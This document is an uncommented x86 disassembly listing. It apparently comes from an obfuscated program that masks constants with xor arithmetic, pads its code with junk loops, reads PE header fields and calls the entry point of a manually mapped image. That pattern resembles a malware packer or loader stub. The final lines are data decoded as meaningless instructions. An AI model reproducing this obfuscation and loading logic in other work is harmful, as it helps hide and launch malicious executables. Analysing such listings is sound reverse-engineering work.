  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41aa46,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41aa46
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41aa46,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41aa46
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41aa46,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x4122f4
  409db9:	xor    edx,DWORD PTR ds:0x4233bf
  409dbf:	mov    DWORD PTR ds:0x4122f4,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415035,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415045
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4233bf,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x4122f0,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417d1d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417d1d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417d1d,edx
  409e22:	cmp    DWORD PTR ds:0x417d1d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41abcb
  409e3c:	push   0x41ac6d
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417d1d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417d1d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417d1d,edx
  409e68:	cmp    DWORD PTR ds:0x417d1d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417d7a
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41aa4a,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412304
  409e8f:	sub    DWORD PTR ds:0x415041,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4233cb,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x41502d,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412300,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x41502d,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x41502d
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x41502d,ecx
  409eee:	cmp    DWORD PTR ds:0x41502d,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x41502d,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417d29,0x412308
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x4122f0,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x4122f0
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x4122f0,edx
  409f3f:	cmp    DWORD PTR ds:0x4122f0,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x4122f0,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415049
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4233c7,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x4122e8,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4233db,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417d25,0x10
  409fd4:	cmp    DWORD PTR ds:0x417d25,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417d25,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4233db
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ac13
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417d25
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417d25,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417d8a
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417d21
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417d19,0x1d
  40a055:	cmp    DWORD PTR ds:0x417d19,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417d19,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417d19,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417d19
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417d19,edx
  40a094:	mov    edx,DWORD PTR ds:0x417d19
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417d19,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417d15,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41aa4a,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415041,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4233d3,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x4122fc,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417d29
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4233cf,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417d25
  40a12f:	xor    DWORD PTR ds:0x4233d7,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4233c7,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41aa46,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4233bf,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x4122e8,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417d29
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x4122f0,0x14
  40a18a:	cmp    DWORD PTR ds:0x4122f0,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x4122f0,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x4122f0
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x4122f0,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41aa52,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41aa52,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41aa52,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41aa64
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41aa52,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41aa52
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41aa52,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41aa52
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41aa52,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41aa42
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4233c7,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41503d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x4122e4,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417d19,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x4122e4,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41230c,0x4122f4
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4233d3,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x4122f8,0x0
  40a63d:	mov    eax,ds:0x4122f8
  40a642:	inc    eax
  40a643:	mov    ds:0x4122f8,eax
  40a648:	cmp    DWORD PTR ds:0x4122f8,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x4122fc
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x4122f8,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x4122f8
  40a675:	inc    eax
  40a676:	mov    ds:0x4122f8,eax
  40a67b:	cmp    DWORD PTR ds:0x4122f8,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417d11,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417d11,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417d11,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417d11,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417d11
  40a721:	dec    eax
  40a722:	mov    ds:0x417d11,eax
  40a727:	mov    eax,ds:0x417d11
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417d11,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x4122e8,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x4122e8
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x4122e8,edx
  40a761:	cmp    DWORD PTR ds:0x4122e8,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x4122e8,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4233bf,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	clc    
  40a7b5:	jecxz  0x40a745
  40a7b7:	pushf  
  40a7b8:	add    eax,0xc57e7e25
  40a7bd:	jg     0x40a83d
  40a7bf:	jle    0x40a77a
  40a7c1:	nop
  40a7c2:	mov    dh,0x51
  40a7c4:	mul    BYTE PTR [ecx]
  40a7c6:	div    BYTE PTR [ecx]
  40a7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c9:	jae    0x40a805
  40a7cb:	jp     0x40a7e7
  40a7cd:	push   ss
  40a7ce:	mov    edi,0x1b9f31b5
  40a7d3:	inc    esi
  40a7d4:	pop    ecx
  40a7d5:	cmp    BYTE PTR [esi-0x20],dh
  40a7d8:	jbe    0x40a7f3
  40a7da:	jle    0x40a7eb
  40a7dc:	jnp    0x40a7ae
  40a7de:	aad    0xa4
  40a7e0:	fwait
  40a7e1:	scas   al,BYTE PTR es:[edi]
  40a7e2:	mov    ecx,0xca033e27
  40a7e7:	sub    al,0x8
  40a7e9:	ja     0x40a83e
  40a7eb:	push   cs
  40a7ec:	pop    edi
  40a7ed:	add    al,0x20
  40a7ef:	jle    0x40a837
